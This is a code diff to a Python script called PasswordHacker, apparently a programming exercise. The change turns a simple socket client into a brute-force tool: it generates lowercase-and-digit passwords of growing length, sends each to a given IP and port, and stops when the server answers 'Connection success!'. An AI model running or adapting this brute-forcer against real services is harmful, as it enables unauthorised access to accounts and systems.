@@ -1,6 +1,8 @@
 import argparse
+import itertools
 import socket
 import os
+import string
 import sys
 
 
@@ -21,8 +23,8 @@ class PasswordHacker:
                                help="You need to choose only one IP address form the list.")
         my_parser.add_argument("Port", metavar="port", type=int,
                                help="You need to input port")
-        my_parser.add_argument("Message", metavar="message", type=str,
-                               help="You need to input message for sending")
+        # my_parser.add_argument("Message", metavar="message", type=str,
+        #                        help="You need to input message for sending")
 
         # Execute the parse_args() method
         args = my_parser.parse_args()
@@ -44,15 +46,39 @@ class PasswordHacker:
 
             client_socket.connect(address)
 
-            data = args.Message
-            data = data.encode()
+            # data = args.Message
+            # data = data.encode()
 
-            client_socket.send(data)
+            password_generator = self.password_generator()
+            self.bruteforce(password_generator, client_socket)
 
+            # client_socket.send(data)
+            #
+            # response = client_socket.recv(1024)
+            # response = response.decode()
+            # print(response)
+
+    # Call custom generator
+    def bruteforce(self, gen_password, client_socket):
+        while True:
+            password = next(gen_password)
+            client_socket.send(password.encode())
             response = client_socket.recv(1024)
-
             response = response.decode()
-            print(response)
+            if response == "Connection success!":
+                print(password)
+                break
+
+    # Custom generator
+    def password_generator(self, max_length=10):
+        # Set Complexity
+        lowercase = list(string.ascii_lowercase)
+        digits = list(string.digits)
+
+        for i in range(1, max_length):
+            complexity = itertools.chain(lowercase, digits)
+            for passwd in itertools.product(complexity, repeat=i):
+                yield "".join(passwd)
 
     def init(self):
         pass
